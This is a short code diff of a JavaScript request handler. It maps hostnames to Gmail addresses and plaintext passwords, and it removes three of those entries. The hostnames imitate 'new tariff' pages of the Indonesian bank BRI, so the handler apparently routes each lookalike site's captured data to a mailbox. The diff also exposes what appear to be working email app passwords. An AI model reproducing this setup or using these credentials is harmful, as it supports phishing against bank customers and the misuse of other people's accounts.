@@ -24,9 +24,6 @@ export default function handler(req, res) {
         email = 'tarifbaru36@gmail.com';
         pass = 'moiasopufjkptyvr';
 
-    } else if(url == ' '){
-        email = 'accbrimo05@gmail.com';
-        pass = 'hluxpmqqqqsjrbaf';
 
     } else if(url == 'bri-tarif.vercel.app'){
         email = 'callbribricoid66@gmail.com';
@@ -36,17 +33,10 @@ export default function handler(req, res) {
         email = 'andarasultan954@gmail.com';
         pass = 'xwjfzwdtiaxfname';
 
-    } else if(url == 'tarif--perubahan.herokuapp.com'){
-        email = 'bbri94669@gmail.com';
-        pass = 'tdoctundphxocdqu';
-
     } else if(url == 'tarifbaru-lama.vercel.app'){
         email = 'wanw4826@gmail.com';
         pass = 'fgevrxoxoymjmzka';
 
-    } else if(url == 'perubah--an-britarifff.herokuapp.com'){
-        email = 'ssamsol397@gmail.com';
-        pass = 'hqkkqinsugrirqne';
 
     }  
         
